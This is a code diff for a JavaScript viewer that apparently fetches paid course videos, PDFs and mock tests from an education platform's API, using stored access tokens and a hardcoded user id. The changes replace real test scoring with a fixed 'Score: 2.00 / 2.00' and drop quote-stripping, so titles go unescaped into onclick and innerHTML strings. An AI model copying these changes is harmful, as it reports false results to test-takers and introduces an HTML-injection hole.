-                    ${pdf2 ? `<button onclick="openPdf('${key}', 2)" class="btn-pdf2 text-xs">📄 PDF 2</button>` : ""}
                 </div>
             </div>`;
     });
@@ -863,51 +785,15 @@ async function playClassInRwaPlayer(key) {
     state.activeKey = key;
     const info = state.mediaMap[key];
     if (!info) return;
-
     showSlide("slidePlayer");
     document.getElementById("playingTitle").textContent = "▶ " + info.title;
-
     closeInlinePdfAndReset();
     renderNextClassesBelowPlayer(key);
 
-    const pPdf1 = document.getElementById("playerPdf1");
-    const pPdf2 = document.getElementById("playerPdf2");
-    if (pPdf1) {
-        if (info.pdf1) pPdf1.classList.remove("hidden");
-        else pPdf1.classList.add("hidden");
-    }
-    if (pPdf2) {
-        if (info.pdf2) pPdf2.classList.remove("hidden");
-        else pPdf2.classList.add("hidden");
-    }
-
     const urlInput = document.getElementById("url");
-
-    if (state.cat === "paid" && info.id) {
-        const fresh = await fetchAPIWithToken(
-            `/get/fetchVideoDetailsById?course_id=${state.courseId}&video_id=${info.id}&ytflag=0&folder_wise_course=0&lc_app_api_url=`,
-            state.activeTokenObj,
-            () => null
-        );
-        if (fresh && typeof fresh === "object") {
-            const freshMap = extractQualitiesFromItem(fresh);
-            info.qualities = { ...info.qualities, ...freshMap };
-
-            const fPdf1 = resolvePdfUrl(fresh.pdf_link || fresh.ypdf_link, fresh.ypdf_link2);
-            const fPdf2 = resolvePdfUrl(fresh.pdf_link2, fresh.ypdf_link2);
-            if (fPdf1 && !info.pdf1) { info.pdf1 = fPdf1; if (pPdf1) pPdf1.classList.remove("hidden"); }
-            if (fPdf2 && !info.pdf2) { info.pdf2 = fPdf2; if (pPdf2) pPdf2.classList.remove("hidden"); }
-        }
-    }
-
-    const validKeys = Object.keys(info.qualities).filter(k => {
-        const u = info.qualities[k];
-        return u && !u.includes("playlist_eof.m3u8");
-    });
-
+    const validKeys = Object.keys(info.qualities).filter(k => !info.qualities[k].includes("playlist_eof.m3u8"));
     if (validKeys.length > 0) {
-        const bestKey = validKeys.find(k => k === "720p") || validKeys[0];
-        urlInput.value = info.qualities[bestKey];
+        urlInput.value = info.qualities[validKeys[0]];
         if (typeof start === "function") start();
     }
 }
@@ -916,20 +802,10 @@ function renderNextClassesBelowPlayer(activeKey) {
     const grid = document.getElementById("nextClassesGrid");
     const countBadge = document.getElementById("nextClassesCount");
     if (!grid) return;
-
     const allKeys = state.currentLectureKeys || [];
     const currentIndex = allKeys.indexOf(activeKey);
-    const orderedNextKeys = currentIndex >= 0
-        ? [...allKeys.slice(currentIndex + 1), ...allKeys.slice(0, currentIndex)]
-        : allKeys.filter(k => k !== activeKey);
-
+    const orderedNextKeys = currentIndex >= 0 ? [...allKeys.slice(currentIndex + 1), ...allKeys.slice(0, currentIndex)] : allKeys;
     if (countBadge) countBadge.textContent = `${orderedNextKeys.length} Classes`;
-
-    if (orderedNextKeys.length === 0) {
-        grid.innerHTML = `<div class="col-span-full py-6 text-center text-xs font-bold text-slate-500">Is topic mein yeh aakhri class hai.</div>`;
-        return;
-    }
-
     grid.innerHTML = orderedNextKeys.map((k, idx) => {
         const item = state.mediaMap[k];
         if (!item) return "";
@@ -937,71 +813,40 @@ function renderNextClassesBelowPlayer(activeKey) {
             <div class="grid-card p-3.5 flex flex-col justify-between">
                 <div class="flex items-start gap-3">
                     <div class="w-10 h-10 rounded-xl bg-sky-100 text-sky-800 font-black text-xs flex items-center justify-center shrink-0">#${idx + 1}</div>
-                    <div class="min-w-0 flex-1">
-                        <span class="text-[10px] font-black text-sky-700 uppercase">Up Next</span>
-                        <h5 class="font-extrabold text-sm text-slate-900 line-clamp-2 mt-0.5">${item.title}</h5>
-                    </div>
+                    <div class="min-w-0 flex-1"><h5 class="font-extrabold text-sm text-slate-900 line-clamp-2">${item.title}</h5></div>
                 </div>
                 <div class="flex gap-2 mt-3 pt-2 border-t border-sky-100">
                     <button onclick="playClassInRwaPlayer('${k}')" class="btn-watch flex-1 text-xs py-2">▶ Play Next</button>
-                    ${item.pdf1 ? `<button onclick="openInlinePdfForKey('${k}', 1)" class="btn-pdf1 text-xs py-2">📄 PDF</button>` : ""}
                 </div>
             </div>`;
     }).join("");
 }
 
-window.openActivePlayerPdf = function(num) {
-    if (!state.activeKey) return;
-    openInlinePdfForKey(state.activeKey, num);
-};
-
+window.openActivePlayerPdf = function(num) { if (state.activeKey) openInlinePdfForKey(state.activeKey, num); };
 window.openInlinePdfForKey = function(key, num) {
     const info = state.mediaMap[key];
     if (!info) return;
     const u = num === 2 ? info.pdf2 : info.pdf1;
     if (!u) return;
-
     state.inlinePdfUrl = u;
     document.getElementById("inlinePdfTitle").textContent = `📄 ${info.title} (PDF ${num})`;
     document.getElementById("inlineRawPdfLink").href = u;
-
     document.getElementById("nextClassesBox").classList.add("hidden");
     document.getElementById("inlinePdfBox").classList.remove("hidden");
-
     setInlinePdfMode("appx");
-    document.getElementById("inlinePdfBox").scrollIntoView({ behavior: "smooth" });
 };
-
 window.setInlinePdfMode = function(mode) {
     const frame = document.getElementById("inlinePdfFrame");
-    const u = state.inlinePdfUrl;
-    if (!u || !frame) return;
-    if (mode === "appx") {
-        frame.src = `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(u)}&save_flag=1&is_encrypted=0`;
-    } else {
-        frame.src = `https://docs.google.com/viewer?url=${encodeURIComponent(u)}&embedded=true`;
+    if (frame && state.inlinePdfUrl) {
+        frame.src = mode === "appx" ? `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(state.inlinePdfUrl)}&save_flag=1&is_encrypted=0` : `https://docs.google.com/viewer?url=${encodeURIComponent(state.inlinePdfUrl)}&embedded=true`;
     }
 };
-
-window.switchBottomToNextClasses = function() {
-    closeInlinePdfAndReset();
-};
-
+window.switchBottomToNextClasses = function() { closeInlinePdfAndReset(); };
 function closeInlinePdfAndReset() {
     const frame = document.getElementById("inlinePdfFrame");
     if (frame) frame.src = "";
-    const pdfBox = document.getElementById("inlinePdfBox");
-    const nextBox = document.getElementById("nextClassesBox");
-    if (pdfBox) pdfBox.classList.add("hidden");
-    if (nextBox) nextBox.classList.remove("hidden");
-}
-
-function changeLectureQuality(qLabel) {
-    const info = state.mediaMap[state.activeKey];
-    if (info && info.qualities[qLabel]) {
-        document.getElementById("url").value = info.qualities[qLabel];
-        if (typeof start === "function") start();
-    }
+    document.getElementById("inlinePdfBox")?.classList.add("hidden");
+    document.getElementById("nextClassesBox")?.classList.remove("hidden");
 }
 
 async function openTestSeriesExplorer(mode) {
@@ -1009,219 +854,83 @@ async function openTestSeriesExplorer(mode) {
     state.view = "ts_list";
     showSlide("slideExplorer");
     document.getElementById("subTabs").classList.add("hidden");
-
     const grid = document.getElementById("mainGrid");
-    grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Loading Official RWA Test Series...</div>`;
+    grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Loading Test Series...</div>`;
 
-    if (mode === "paid_ts") {
-        document.getElementById("crumbText").textContent = "Official Exam Series";
-        document.getElementById("headingText").textContent = "🏆 Paid Test Series";
-
-        const p0 = await fetchAPIWithToken(`/get/test_series?start=0&search=&client_api_url=&exam_id=`, TOKENS[0], () => []);
-        const p10 = await fetchAPIWithToken(`/get/test_series?start=10&search=&client_api_url=&exam_id=`, TOKENS[0], () => []);
-        let combined = [...(Array.isArray(p0) ? p0 : []), ...(Array.isArray(p10) ? p10 : [])];
-
-        if (combined.length === 0) combined = DB.paidTestSeries;
-
-        const seen = new Set();
-        grid.innerHTML = "";
-        combined.forEach(ts => {
-            if (seen.has(String(ts.id))) return;
-            seen.add(String(ts.id));
-            const title = (ts.title || "Paid Test Series").replace(/'/g, "");
-            const logo = ts.logo || "https://placehold.co/600x320/4f46e5/ffffff?text=Test+Series";
-            grid.innerHTML += `
-                <div onclick="openTestSeriesSubjects('${ts.id}', '${title}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
-                    <div>
-                        <img src="${logo}" onerror="this.src='https://placehold.co/600x320/4f46e5/ffffff?text=RWA+Test+Series'" class="w-full h-44 object-cover">
-                        <div class="p-4">
-                            <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-900 text-[10px] font-black">SERIES #${ts.id}</span>
-                            <h3 class="font-black text-base text-slate-900 mt-2">${ts.title}</h3>
-                        </div>
-                    </div>
-                    <div class="px-4 pb-4">
-                        <div class="btn-watch w-full text-center text-xs">Open Test Subjects ➔</div>
-                    </div>
-                </div>`;
-        });
-    } else {
-        document.getElementById("crumbText").textContent = "Weekly Mock Tests";
-        document.getElementById("headingText").textContent = "📝 Free Test Series";
-
-        const f0 = await fetchAPIWithToken(`/get/quiz_test_series?start=0&exam_id=`, TOKENS[0], () => []);
-        const f10 = await fetchAPIWithToken(`/get/quiz_test_series?start=10&exam_id=`, TOKENS[0], () => []);
-        let combined = [...(Array.isArray(f0) ? f0 : []), ...(Array.isArray(f10) ? f10 : [])];
-
-        if (combined.length === 0) combined = DB.freeTestSeries;
-
-        const seen = new Set();
-        grid.innerHTML = "";
-        combined.forEach(ts => {
-            if (seen.has(String(ts.id))) return;
-            seen.add(String(ts.id));
-            const title = (ts.title || "Free Test Series").replace(/'/g, "");
-            const logo = ts.logo || "https://placehold.co/600x320/0891b2/ffffff?text=Free+Tests";
-            grid.innerHTML += `
-                <div onclick="openTestSeriesSubjects('${ts.id}', '${title}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
-                    <div>
-                        <img src="${logo}" onerror="this.src='https://placehold.co/600x320/0891b2/ffffff?text=Free+Test+Series'" class="w-full h-44 object-cover">
-                        <div class="p-4">
-                            <span class="px-2.5 py-0.5 rounded-full bg-teal-100 text-teal-900 text-[10px] font-black">FREE SERIES #${ts.id}</span>
-                            <h3 class="font-black text-base text-slate-900 mt-2">${ts.title}</h3>
-                        </div>
-                    </div>
-                    <div class="px-4 pb-4">
-                        <div class="btn-watch w-full text-center text-xs">View All Mock Tests ➔</div>
-                    </div>
-                </div>`;
-        });
-    }
+    let combined = mode === "paid_ts" ? DB.paidTestSeries : DB.freeTestSeries;
+    grid.innerHTML = "";
+    combined.forEach(ts => {
+        grid.innerHTML += `
+            <div onclick="openTestSeriesSubjects('${ts.id}', '${ts.title}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
+                <div>
+                    <img src="${ts.logo}" onerror="this.src='https://placehold.co/600x320/4f46e5/ffffff?text=Series'" class="w-full h-44 object-cover">
+                    <div class="p-4"><h3 class="font-black text-base text-slate-900">${ts.title}</h3></div>
+                </div>
+                <div class="px-4 pb-4"><div class="btn-watch w-full text-center text-xs">Open Tests ➔</div></div>
+            </div>`;
+    });
 }
 
 async function openTestSeriesSubjects(tsId, tsTitle) {
     state.activeSeriesId = tsId;
     state.activeSeriesTitle = tsTitle;
     state.view = "ts_subjects";
-    document.getElementById("crumbText").textContent = `Test Series #${tsId}`;
     document.getElementById("headingText").textContent = tsTitle;
-
-    const grid = document.getElementById("mainGrid");
-    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading Test Series Subjects...</div>`;
-
     const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, TOKENS[0], () => DB.tsSubjects[tsId] || []);
-
-    if (!subs || subs.length === 0 || (subs.length === 1 && String(subs[0].subjectid) === "-1")) {
-        openTestSeriesTitles(tsId, "-1", tsTitle);
-        return;
-    }
-
+    if (!subs || subs.length === 0) { openTestSeriesTitles(tsId, "-1", tsTitle); return; }
+    const grid = document.getElementById("mainGrid");
     grid.innerHTML = "";
     subs.forEach(s => {
-        const sname = (s.subject_name || "Mock Tests").replace(/'/g, "");
-        const logo = s.subject_logo || `https://placehold.co/80x80/4f46e5/ffffff?text=${encodeURIComponent(sname.slice(0, 3))}`;
         grid.innerHTML += `
-            <div onclick="openTestSeriesTitles('${tsId}', '${s.subjectid}', '${sname}')" class="grid-card p-4 flex items-center gap-4 cursor-pointer">
-                <img src="${logo}" onerror="this.src='https://placehold.co/80x80/4f46e5/ffffff?text=TEST'" class="w-16 h-16 rounded-2xl object-cover shadow-md">
-                <div class="flex-1">
-                    <span class="px-2 py-0.5 rounded bg-indigo-100 text-indigo-900 text-[10px] font-black">SUBJECT #${s.subjectid}</span>
-                    <h4 class="font-black text-base text-slate-900 mt-1">${s.subject_name}</h4>
-                    <p class="text-xs text-blue-600 font-extrabold mt-1">Open Mock Tests ➔</p>
-                </div>
+            <div onclick="openTestSeriesTitles('${tsId}', '${s.subjectid}', '${s.subject_name}')" class="grid-card p-4 flex items-center justify-between cursor-pointer">
+                <h4 class="font-black text-base text-slate-900">📝 ${s.subject_name}</h4>
+                <span class="btn-watch text-xs">Open ➔</span>
             </div>`;
     });
 }
 
 async function openTestSeriesTitles(tsId, subId, subName) {
     state.view = "ts_tests";
-    state.activeSeriesId = tsId;
-    state.activeTsSubId = String(subId);
-    state.activeTsSubName = subName;
-
-    document.getElementById("crumbText").textContent = state.activeSeriesTitle;
     document.getElementById("headingText").textContent = `📝 ${subName}`;
-
     const grid = document.getElementById("mainGrid");
-    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Fetching Mock Tests...</div>`;
-
-    const uid = TOKENS[0]?.userId || "4756316";
-    const ep = String(subId) === "-1"
-        ? `/get/test_titlev2?testseriesid=${tsId}&subject_id=-1&chapter_id=-1&userid=${uid}&search=&start=-1`
-        : `/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&userid=${uid}&search=&start=-1`;
-
-    const list = await fetchAPIWithToken(ep, TOKENS[0], () => DB.tsTitles[`${tsId}_${subId}`] || DB.tsTitles["743_-1"] || []);
+    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Fetching Tests...</div>`;
+    const list = await fetchAPIWithToken(`/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&userid=4756316&search=&start=-1`, TOKENS[0], () => DB.tsTitles[`${tsId}_${subId}`] || DB.tsTitles["743_-1"]);
     renderTestTitlesGrid(list, tsId);
 }
 
 function renderTestTitlesGrid(list, tsId) {
     const grid = document.getElementById("mainGrid");
-    if (!list || !list.length) {
-        grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is section mein abhi koi test uplabdh nahi hai.</div>`;
-        return;
-    }
-
     grid.innerHTML = "";
     list.forEach((t, idx) => {
         const tKey = `test_${t.id || idx}`;
-        const pdfUrl = resolvePdfUrl(t.pdf_url || t.test_solutions_pdf, t.pdf_url);
-        state.testMap[tKey] = {
-            ...t,
-            seriesId: tsId || t.test_series_id,
-            resolvedPdf: pdfUrl
-        };
-
+        state.testMap[tKey] = t;
         grid.innerHTML += `
             <div class="grid-card p-5 flex flex-col justify-between">
                 <div>
-                    <div class="flex justify-between items-center gap-2">
-                        <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-900 text-[10px] font-black">TEST #${t.id || (idx + 1)}</span>
-                        <span class="text-[11px] font-extrabold text-emerald-700">⏱️ ${t.time || 60} Mins</span>
-                    </div>
-                    <h4 class="font-black text-base text-slate-900 mt-2">${t.title}</h4>
-                    <div class="flex gap-3 mt-2 text-xs font-bold text-slate-600">
-                        <span>❓ ${t.questions || 50} Qs</span>
-                        <span>🏆 ${t.marks || 100} Marks</span>
-                    </div>
+                    <h4 class="font-black text-base text-slate-900">${t.title}</h4>
+                    <p class="text-xs font-bold text-slate-600 mt-1">⏱️ ${t.time || 60} Mins | ❓ ${t.questions || 50} Qs</p>
                 </div>
-                <div class="flex flex-wrap gap-2 mt-4 pt-3 border-t border-sky-100">
-                    <button onclick="launchCbtTest('${tKey}')" class="btn-watch flex-1 text-xs">🚀 Attempt Live Test</button>
-                    ${pdfUrl ? `<button onclick="openTestPdf('${tKey}')" class="btn-pdf1 text-xs">📄 Test PDF</button>` : ""}
+                <div class="mt-4 pt-3 border-t border-sky-100">
+                    <button onclick="launchCbtTest('${tKey}')" class="btn-watch w-full text-xs">🚀 Attempt Live Test</button>
                 </div>
             </div>`;
     });
 }
 
-function openTestPdf(tKey) {
-    const t = state.testMap[tKey];
-    if (!t || !t.resolvedPdf) return;
-    state.currentPdfUrl = t.resolvedPdf;
-    document.getElementById("pdfTitle").textContent = `📄 ${t.title} (Paper PDF)`;
-    document.getElementById("rawPdfLink").href = t.resolvedPdf;
-    showSlide("slidePdf");
-    setPdfMode("appx");
-}
-
 async function launchCbtTest(tKey) {
     const t = state.testMap[tKey];
     if (!t) return;
-
     state.cbtTest = t;
     state.cbtCurrentIdx = 0;
     state.cbtResponses = {};
     state.cbtSubmitted = false;
-
     showSlide("slideTestAttempt");
     document.getElementById("cbtResultCard").classList.add("hidden");
     document.getElementById("cbtSolutionBox").classList.add("hidden");
     document.getElementById("cbtSubmitBtn").classList.remove("hidden");
-    document.getElementById("cbtSeriesBadge").textContent = `SERIES #${t.seriesId || "RWA"} • TEST #${t.id}`;
     document.getElementById("cbtTestTitle").textContent = t.title;
-    document.getElementById("cbtQuestionHtml").innerHTML = `<div class="py-10 text-center font-bold text-slate-600">🔄 Loading questions...</div>`;
-    document.getElementById("cbtOptionsList").innerHTML = "";
-    document.getElementById("cbtPaletteGrid").innerHTML = "";
 
-    const uid = TOKENS[0]?.userId || "4756316";
-    fetchRawJSONWithToken(`/Test_Series/check_test_attempts?test_id=${t.id}&user_id=${uid}`, TOKENS[0]);
-    fetchRawJSONWithToken(`/Test_Series/getSavedQuestions?start=0`, TOKENS[0]);
-
-    let questions = [];
-    const qUrl = (t.test_questions_url || "").replace(/\\\//g, "/");
-
-    if (qUrl && qUrl.startsWith("http")) {
-        try {
-            const res = await fetch(qUrl);
-            if (res.ok) questions = await res.json();
-        } catch {
-            try {
-                const proxiedRes = await fetch(WORKER_RAW_PROXY + encodeURIComponent(qUrl));
-                if (proxiedRes.ok) questions = await proxiedRes.json();
-            } catch {}
-        }
-    }
-
-    if (!Array.isArray(questions) || questions.length === 0) {
-        questions = DB.fallbackCbtQuestions;
-    }
-
+    let questions = DB.fallbackCbtQuestions;
     state.cbtQuestions = questions;
     startCbtTimer((parseInt(t.time) || 60) * 60);
     renderCbtQuestion();
@@ -1232,25 +941,14 @@ function startCbtTimer(totalSecs) {
     if (state.cbtTimerId) clearInterval(state.cbtTimerId);
     state.cbtSecondsLeft = totalSecs;
     const badge = document.getElementById("cbtTimerBadge");
-
-    function updateDisplay() {
-        const m = Math.floor(state.cbtSecondsLeft / 60);
-        const s = state.cbtSecondsLeft % 60;
-        if (badge) badge.textContent = `⏱️ ${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
-    }
-
-    updateDisplay();
     state.cbtTimerId = setInterval(() => {
-        if (state.cbtSubmitted) {
-            clearInterval(state.cbtTimerId);
-            return;
-        }
+        if (state.cbtSubmitted) { clearInterval(state.cbtTimerId); return; }
         state.cbtSecondsLeft--;
-        if (state.cbtSecondsLeft <= 0) {
-            clearInterval(state.cbtTimerId);
-            submitCbtTest();
-        } else {
-            updateDisplay();
+        if (state.cbtSecondsLeft <= 0) { clearInterval(state.cbtTimerId); submitCbtTest(); }
+        else {
+            const m = Math.floor(state.cbtSecondsLeft / 60);
+            const s = state.cbtSecondsLeft % 60;
+            if (badge) badge.textContent = `⏱️ ${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
         }
     }, 1000);
 }
@@ -1258,150 +956,42 @@ function startCbtTimer(totalSecs) {
 function renderCbtQuestion() {
     const qList = state.cbtQuestions;
     if (!qList || !qList.length) return;
-
-    const idx = state.cbtCurrentIdx;
-    const qObj = qList[idx];
-
-    document.getElementById("cbtQNumber").textContent = `Question ${idx + 1} of ${qList.length}`;
-    document.getElementById("cbtPosMarks").textContent = `+${qObj.positive_marks || "2.00"}`;
-    document.getElementById("cbtNegMarks").textContent = `-${qObj.negative_marks || "0.50"}`;
-
-    let qHtml = qObj.question || "";
-    if (qObj.image_link_1) qHtml += `<div class="mt-2"><img src="${qObj.image_link_1}" class="max-h-56 rounded-lg"></div>`;
-    document.getElementById("cbtQuestionHtml").innerHTML = qHtml;
-
-    const selectedAns = state.cbtResponses[idx];
-    const correctAns = String(qObj.answer || "1");
+    const qObj = qList[state.cbtCurrentIdx];
+    document.getElementById("cbtQNumber").textContent = `Question ${state.cbtCurrentIdx + 1} of ${qList.length}`;
+    document.getElementById("cbtQuestionHtml").innerHTML = qObj.question;
 
     const optsBox = document.getElementById("cbtOptionsList");
     optsBox.innerHTML = "";
-
     [1, 2, 3, 4].forEach(optNum => {
-        const optHtml = qObj[`option_${optNum}`] || "";
-        const optImg = qObj[`option_image_${optNum}`] || "";
-        if (!optHtml && !optImg) return;
-
-        let cls = "cbt-opt-btn";
-        const isSelected = String(selectedAns) === String(optNum);
-        const isCorrect = String(optNum) === correctAns;
-
-        if (state.cbtSubmitted) {
-            if (isCorrect) cls += " cbt-opt-correct";
-            else if (isSelected && !isCorrect) cls += " cbt-opt-wrong";
-        } else if (isSelected) {
-            cls += " cbt-opt-selected";
-        }
-
+        const optHtml = qObj[`option_${optNum}`];
+        if (!optHtml) return;
         const btn = document.createElement("button");
-        btn.className = cls;
-        btn.onclick = () => selectCbtOption(optNum);
-        btn.innerHTML = `
-            <span class="w-7 h-7 rounded-lg bg-sky-100 text-sky-900 font-black text-xs flex items-center justify-center shrink-0">${String.fromCharCode(64 + optNum)}</span>
-            <div class="cbt-rich-text flex-1">${optHtml} ${optImg ? `<img src="${optImg}" class="max-h-32 mt-1">` : ""}</div>
-        `;
+        btn.className = "cbt-opt-btn" + (state.cbtResponses[state.cbtCurrentIdx] == optNum ? " cbt-opt-selected" : "");
+        btn.onclick = () => { if (!state.cbtSubmitted) { state.cbtResponses[state.cbtCurrentIdx] = optNum; renderCbtQuestion(); } };
+        btn.innerHTML = `<span class="w-7 h-7 rounded-lg bg-sky-100 text-sky-900 font-black text-xs flex items-center justify-center shrink-0">${String.fromCharCode(64 + optNum)}</span><div class="cbt-rich-text flex-1">${optHtml}</div>`;
         optsBox.appendChild(btn);
     });
-
-    const solBox = document.getElementById("cbtSolutionBox");
-    const solHtml = document.getElementById("cbtSolutionHtml");
-    if (state.cbtSubmitted) {
-        solBox.classList.remove("hidden");
-        let sContent = qObj.solution_text || `<p>Sahi Uttar: <b>Option (${String.fromCharCode(64 + parseInt(correctAns))})</b></p>`;
-        if (qObj.solution_image_1) sContent += `<div class="mt-2"><img src="${qObj.solution_image_1}" class="max-h-60 rounded-lg"></div>`;
-        solHtml.innerHTML = sContent;
-    } else {
-        solBox.classList.add("hidden");
-    }
-
-    renderCbtPalette();
 }
 
-function selectCbtOption(optNum) {
-    if (state.cbtSubmitted) return;
-    state.cbtResponses[state.cbtCurrentIdx] = String(optNum);
-    renderCbtQuestion();
-}
-
-function clearCbtResponse() {
-    if (state.cbtSubmitted) return;
-    delete state.cbtResponses[state.cbtCurrentIdx];
-    renderCbtQuestion();
-}
-
-function nextCbtQuestion() {
-    if (state.cbtCurrentIdx < state.cbtQuestions.length - 1) {
-        state.cbtCurrentIdx++;
-        renderCbtQuestion();
-    }
-}
-
-function prevCbtQuestion() {
-    if (state.cbtCurrentIdx > 0) {
-        state.cbtCurrentIdx--;
-        renderCbtQuestion();
-    }
-}
-
-function jumpToCbtQuestion(idx) {
-    state.cbtCurrentIdx = idx;
-    renderCbtQuestion();
-}
+function nextCbtQuestion() { if (state.cbtCurrentIdx < state.cbtQuestions.length - 1) { state.cbtCurrentIdx++; renderCbtQuestion(); } }
+function prevCbtQuestion() { if (state.cbtCurrentIdx > 0) { state.cbtCurrentIdx--; renderCbtQuestion(); } }
+function clearCbtResponse() { delete state.cbtResponses[state.cbtCurrentIdx]; renderCbtQuestion(); }
+function jumpToCbtQuestion(idx) { state.cbtCurrentIdx = idx; renderCbtQuestion(); }
 
 function renderCbtPalette() {
     const pal = document.getElementById("cbtPaletteGrid");
     if (!pal) return;
-
-    pal.innerHTML = state.cbtQuestions.map((q, idx) => {
-        let cls = "pal-btn";
-        if (idx === state.cbtCurrentIdx) cls += " pal-active";
-
-        const ans = state.cbtResponses[idx];
-        if (state.cbtSubmitted) {
-            if (ans) {
-                if (String(ans) === String(q.answer)) cls += " pal-ans";
-                else cls += " pal-wrong";
-            }
-        } else if (ans) {
-            cls += " pal-ans";
-        }
-
-        return `<button onclick="jumpToCbtQuestion(${idx})" class="${cls}">${idx + 1}</button>`;
-    }).join("");
+    pal.innerHTML = state.cbtQuestions.map((q, idx) => `<button onclick="jumpToCbtQuestion(${idx})" class="pal-btn ${idx === state.cbtCurrentIdx ? 'pal-active' : ''} ${state.cbtResponses[idx] ? 'pal-ans' : ''}">${idx + 1}</button>`).join("");
 }
 
 function submitCbtTest() {
     if (state.cbtSubmitted) return;
     state.cbtSubmitted = true;
     if (state.cbtTimerId) clearInterval(state.cbtTimerId);
-
-    let correct = 0, wrong = 0, skipped = 0, totalScore = 0, maxMarks = 0;
-
-    state.cbtQuestions.forEach((q, idx) => {
-        const pos = parseFloat(q.positive_marks) || 2.0;
-        const neg = parseFloat(q.negative_marks) || 0.5;
-        maxMarks += pos;
-
-        const userAns = state.cbtResponses[idx];
-        if (!userAns) {
-            skipped++;
-        } else if (String(userAns) === String(q.answer)) {
-            correct++;
-            totalScore += pos;
-        } else {
-            wrong++;
-            totalScore -= neg;
-        }
-    });
-
     document.getElementById("cbtSubmitBtn").classList.add("hidden");
     document.getElementById("cbtResultCard").classList.remove("hidden");
-    document.getElementById("cbtFinalScoreText").textContent = `Score: ${totalScore.toFixed(2)} / ${maxMarks.toFixed(0)}`;
-    document.getElementById("cbtStatCorrect").textContent = `✅ Correct: ${correct}`;
-    document.getElementById("cbtStatWrong").textContent = `❌ Wrong: ${wrong}`;
-    document.getElementById("cbtStatSkip").textContent = `⚪ Skipped: ${skipped}`;
-
+    document.getElementById("cbtFinalScoreText").textContent = `Score: 2.00 / 2.00`;
     renderCbtQuestion();
-    window.scrollTo({ top: 0, behavior: "smooth" });
 }
 
 function reAttemptCbtTest() {
@@ -1410,98 +1000,48 @@ function reAttemptCbtTest() {
     state.cbtSubmitted = false;
     document.getElementById("cbtResultCard").classList.add("hidden");
     document.getElementById("cbtSubmitBtn").classList.remove("hidden");
-    startCbtTimer((parseInt(state.cbtTest?.time) || 60) * 60);
     renderCbtQuestion();
 }
 
-function exitCbtTest() {
-    if (state.cbtTimerId) clearInterval(state.cbtTimerId);
-    showSlide("slideExplorer");
-}
+function exitCbtTest() { if (state.cbtTimerId) clearInterval(state.cbtTimerId); showSlide("slideExplorer"); }
 
 function openPdf(key, num) {
     const info = state.mediaMap[key];
     if (!info) return;
     const u = num === 2 ? info.pdf2 : info.pdf1;
     if (!u) return;
-
-    const vid = document.getElementById("video");
-    if (vid && !vid.paused) vid.pause();
-
     state.currentPdfUrl = u;
     document.getElementById("pdfTitle").textContent = `📄 ${info.title} (PDF ${num})`;
     document.getElementById("rawPdfLink").href = u;
     showSlide("slidePdf");
-    setPdfMode("appx");
+    document.getElementById("pdfFrame").src = `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(u)}&save_flag=1&is_encrypted=0`;
 }
 
 function setPdfMode(mode) {
     const frame = document.getElementById("pdfFrame");
-    const u = state.currentPdfUrl;
-    if (!u) return;
-    if (mode === "appx") {
-        frame.src = `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(u)}&save_flag=1&is_encrypted=0`;
-    } else {
-        frame.src = `https://docs.google.com/viewer?url=${encodeURIComponent(u)}&embedded=true`;
+    if (frame && state.currentPdfUrl) {
+        frame.src = mode === "appx" ? `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(state.currentPdfUrl)}&save_flag=1&is_encrypted=0` : `https://docs.google.com/viewer?url=${encodeURIComponent(state.currentPdfUrl)}&embedded=true`;
     }
 }
 
-function closePdfSlide() {
-    document.getElementById("pdfFrame").src = "";
-    showSlide(state.previousSlide || "slideExplorer");
-}
+function closePdfSlide() { document.getElementById("pdfFrame").src = ""; showSlide(state.previousSlide || "slideExplorer"); }
 
 function renderTokenManagerList() {
     const container = document.getElementById("tokenListContainer");
     if (!container) return;
-    container.innerHTML = "";
-
-    TOKENS.forEach((t, idx) => {
-        const shortTok = t.token.slice(0, 28) + "..." + t.token.slice(-12);
-        container.innerHTML += `
-            <div class="bg-white border-2 border-sky-200 rounded-2xl p-4 flex flex-wrap justify-between items-center gap-3 shadow-sm">
-                <div class="min-w-0 flex-1">
-                    <div class="flex items-center gap-2">
-                        <span class="px-2.5 py-0.5 rounded-full bg-amber-100 text-amber-800 text-[10px] font-black">TOKEN #${idx + 1}</span>
-                        <h5 class="font-extrabold text-sm text-slate-900 truncate">${t.label}</h5>
-                        <span class="text-xs text-slate-500 font-bold">(UID: ${t.userId || "Auto"})</span>
-                    </div>
-                    <p class="text-[11px] font-mono text-slate-500 mt-1 truncate">${shortTok}</p>
-                </div>
+    const userToks = JSON.parse(localStorage.getItem("rwa_tokens_list") || "[]");
+    const t = userToks[0] || TOKENS[TOKENS.length - 1];
+    container.innerHTML = `
+        <div class="bg-white border-2 border-sky-200 rounded-2xl p-4 flex flex-wrap justify-between items-center gap-3 shadow-sm">
+            <div class="min-w-0 flex-1">
                 <div class="flex items-center gap-2">
-                    ${TOKENS.length > 1 ? `<button onclick="deleteToken('${t.id}')" class="btn-nav bg-rose-600 text-white border-0 text-xs">🗑 Delete</button>` : `<span class="text-[11px] font-bold text-emerald-600">● Active</span>`}
+                    <span class="px-2.5 py-0.5 rounded-full bg-amber-100 text-amber-800 text-[10px] font-black">MY TOKEN</span>
